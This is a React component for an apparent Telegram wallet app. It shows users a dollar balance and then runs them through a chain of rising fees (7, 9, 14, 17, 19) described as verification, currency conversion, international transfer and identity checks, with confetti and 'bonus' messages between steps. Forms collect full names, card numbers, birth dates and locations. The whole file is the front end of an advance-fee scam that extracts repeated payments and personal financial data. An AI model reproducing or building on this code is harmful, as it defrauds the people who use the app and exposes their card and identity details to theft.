/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable react/no-unescaped-entities */
import { TailSpin } from "react-loader-spinner";
import { useSelector } from "react-redux";
import { Link, useNavigate } from "react-router-dom";
import Modal from "../../UI/Modal";
import { FaSmileBeam } from "react-icons/fa";

import { useEffect, useState } from "react";
import { checkPaymanetStatus, getCurrency } from "../../../util/back/requests";
import ConfettiExplosion from "react-confetti-explosion";
import WebApp from "@twa-dev/sdk";
import { IoSadOutline } from "react-icons/io5";

const WalletCard = () => {
  const balance = useSelector((state) => state.auth.balance);
  const statusOrder = localStorage.getItem("statusOrder");
  const priceAmount = localStorage.getItem("priceAmount");

  const [list, setList] = useState();
  const [status, setStatus] = useState(statusOrder);
  const navigate = useNavigate();
  const [confetti, setConfetti] = useState();
  const storageCurrency = localStorage.getItem("country")
    ? localStorage.getItem("country")
    : "ARS";
  const activeCurrency = list?.find((el) => el.country == storageCurrency);
  useEffect(() => {
    const fetchData = async () => {
      const response = await getCurrency();
      setList(response);
    };
    fetchData();
  }, []);

  const getBonus = async () => {
    localStorage.setItem("statusOrder", "VERIFY");
    // const newData = await getUserInfo(TG_ID);
    setConfetti(true);
  };

  useEffect(() => {
    let isMounted = true;
    const checkStatus = async () => {
      const response = await checkPaymanetStatus();

      if (response == "APPROVED") {
        if (priceAmount == 14) {
          localStorage.setItem("statusOrder", "NATIONAL");
          setStatus("NATIONAL");
        } else if (priceAmount == 17) {
          localStorage.setItem("statusOrder", "VERIFY");
          setStatus("VERIFY");
        } else {
          localStorage.setItem("statusOrder", "SUCCESSFUL");
          setStatus("SUCCESSFUL");
        }
      } else if (response == "DECLINED") {
        localStorage.removeItem("statusOrder");
        setStatus("DECLINE");
      }
    };

    // const interval = setInterval(() => {
    //   if (status === "WAITING") {
    //     checkStatus();
    //   }
    // }, 1000);
    if (isMounted && status === "WAITING") {
      setTimeout(checkStatus, 1000);
    }
    if (status === "WAITING") {
      checkStatus();
    }

    return () => {
      isMounted = false; // Очищення при розмонтуванні компонента.
    };
  }, [status, priceAmount]);

  return (
    <>
      {confetti && <ConfettiExplosion />}
      <Modal
        isOpen={
          status == "WAITING" ||
          status == "SUCCESSFUL" ||
          status == "VERIFIED" ||
          status == "NATIONAL" ||
          status == "IDENF" ||
          status == "DECLINE"
        }
      >
        {status == "DECLINE" && (
          <div className="flex-1 text-[20px] flex flex-col items-center gap-2  text-[#E7FF2B]">
            <div className="flex-1 text-[20px] flex items-center gap-2  text-[#E7FF2B]">
              Status: declined{" "}
              <div className="text-[150%]">
                <IoSadOutline />
              </div>
            </div>
            <div className="text-[14px]">
              Your payment did not go through, perhaps you made a mistake or
              there is a delay in payment. Write to technical support and
              clarify the reason
            </div>
            <div className="w-full mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                onClick={() => setStatus("")}
              >
                Ok
              </button>
            </div>
          </div>
        )}
        {status == "WAITING" && (
          <div className="flex-1 text-[20px] flex flex-col items-center gap-2  text-[#E7FF2B]">
            <p> Status: waiting for</p>
            <div className="flex item-center gap-2">
              <p> payment confirmation</p>
              <div>
                <TailSpin
                  visible={true}
                  height="20"
                  width="20"
                  color="yellow"
                />
              </div>
            </div>
            <div className="w-full mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                onClick={() => setStatus(false)}
              >
                Ok
              </button>
            </div>
          </div>
        )}
        {status == "SUCCESSFUL" && (
          <>
            <div className="flex-1 text-[20px] flex items-center gap-2  text-[#E7FF2B]">
              Status: successful{" "}
              <div className="text-[150%]">
                <FaSmileBeam />
              </div>
            </div>
            <div className="text-[16px] mt-4">
              We apologize for the inconvenience caused, we on our part offer
              you to get a bonus of ${" "}
              {priceAmount == 7 ? 30 : priceAmount == 9 ? 9 : 7} click on the
              button below
            </div>
            <div className="w-full mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                onClick={() => {
                  setStatus("VERIFY");
                  getBonus();
                }}
              >
                Get a bonus
              </button>
            </div>
          </>
        )}
        {status == "VERIFIED" && (
          <form
            className="text-[18px] text-justify flex flex-col gap-4 w-full"
            onSubmit={() => {
              WebApp.HapticFeedback.notificationOccurred("success");
              navigate(
                `/menu/wallet/withdraw-second?currency=${activeCurrency.value}&country=${activeCurrency.country}&type=second`,
              );
            }}
          >
            <h1 className="text-center text-[24px]">Enter your details</h1>
            {status == "VERIFIED" && priceAmount == 14 && (
              <div className="text-[13px]">
                Because your earnings are in dollars, you'll have to pay a fee
                the conversion to your country's currency and you'll get your
                earnings within 2-3 minutes. within 2-3 minutes and it also has
                a button “pay for conversion”.
              </div>
            )}
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Enter your full name"
                required
              />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Enter your bank name (optional)"
              />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Enter your card number"
                required
              />
            </div>

            <div className="flex gap-2 w-full items-center  mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                type="submit"
              >
                PAY {activeCurrency?.value * priceAmount}{" "}
                {activeCurrency?.country}
              </button>
              {/* <button className="w-full rounded-md outline outline-2 outline-[#E7FF2B] py-1">
                Cancel
              </button> */}
            </div>
          </form>
        )}
        {status == "NATIONAL" && (
          <div className="text-[15px]">
            Dear user, due to the fact that the bank that will send you your
            money is in another country you will need to deposit (the amount in
            its currency base 17$), this is the amount that you will be added to
            your earnings immediately after payment.
            <button
              className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1 mt-8"
              type="submit"
              onClick={() => {
                WebApp.HapticFeedback.notificationOccurred("success");
                localStorage.setItem("priceAmount", 17);
                navigate(
                  `/menu/wallet/withdraw-second?currency=${activeCurrency.value}&country=${activeCurrency.country}&type=third`,
                );
              }}
            >
              PAY INTERNATIONAL TRANSFER
            </button>
          </div>
        )}
        {status == "IDENF" && (
          <form
            className="text-[18px] text-justify flex flex-col gap-4 w-full"
            onSubmit={() => {
              localStorage.setItem("priceAmount", 19);
              WebApp.HapticFeedback.notificationOccurred("success");
              navigate(
                `/menu/wallet/withdraw-second?currency=${activeCurrency.value}&country=${activeCurrency.country}&type=fourth`,
              );
            }}
          >
            <h1 className="text-center text-[24px]">Enter your details</h1>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Enter your full name"
                required
              />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input className="w-full" placeholder="Date of birthd" required />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input className="w-full" placeholder="Country, city" required />
            </div>
            <div className="rounded-[28px] w-full bg-[#FFFFFF66] p-3">
              <input
                className="w-full"
                placeholder="Enter your bank name (optional)"
              />
            </div>

            <div className="flex gap-2 w-full items-center  mt-4">
              <button
                className=" bg-[#E7FF2B] rounded-md w-full text-[#37C100] py-1"
                type="submit"
              >
                PAY {activeCurrency?.value * 19} {activeCurrency?.country}
              </button>
              {/* <button className="w-full rounded-md outline outline-2 outline-[#E7FF2B] py-1">
                Cancel
              </button> */}
            </div>
          </form>
        )}
      </Modal>
      <div
        className="w-full flex flex-col pl-[20px] py-[15px] text-[#1E1E1E] rounded-[25px] mt-[18px]"
        id="wallet-card"
      >
        <div className="w-max relative">
          <h1 className="text-[38px] w-max leading-10">
            {balance ? balance.toFixed(2) : "0.00"} USD
          </h1>
          <div className="w-full flex justify-end text-[14px]">
            {/* <div>**** 4562</div> */}

            <div>Your cash</div>
          </div>
          <div className="mt-8 text-[11px]">Withdrawal from 25 USD </div>
        </div>
      </div>
      <div className="w-full px-[20px]">
        <div className="w-full bg-[#E7FF2B5E] rounded-b-[25px] px-[10px] grid grid-cols-2 gap-[10px]">
          <Link
            to="/menu/wallet/history"
            className="border-[4px] border-white rounded-[28px] flex items-center justify-center py-[16px] my-[12px]"
          >
            History
          </Link>
          {statusOrder == "WAITING" ? (
            <div
              onClick={() => setStatus("WAITING")}
              className="rounded-[28px] flex items-center justify-center text-[#1E1E1E] bg-white py-[16px] my-[12px]"
            >
              Withdr
            </div>
          ) : (
            <Link
              to="/menu/wallet/country-select"
              className="rounded-[28px] flex items-center justify-center text-[#1E1E1E] bg-white py-[16px] my-[12px]"
            >
              Withdr
            </Link>
          )}

          {status == "VERIFY" && (
            <div className="w-full flex items-center justify-center col-span-2 px-6">
              <button
                className=" bg-[#E7FF2B] rounded-[28px] w-full text-[#37C100] py-2 mb-4"
                onClick={() => {
                  localStorage.setItem(
                    "priceAmount",
                    priceAmount == 7
                      ? 9
                      : priceAmount == 9
                        ? 14
                        : priceAmount == 14
                          ? 17
                          : 19,
                  );
                  if (priceAmount == 19) {
                    localStorage.setItem("statusOrder", "IDENF");
                    setStatus("IDENF");
                  } else {
                    localStorage.setItem("statusOrder", "VERIFIED");
                    setStatus("VERIFIED");
                  }
                }}
              >
                {priceAmount == 7
                  ? "Verify details"
                  : priceAmount == 17
                    ? "Identity verification"
                    : "Currency conversion"}
              </button>
            </div>
          )}
        </div>
      </div>
    </>
  );
};

export default WalletCard;
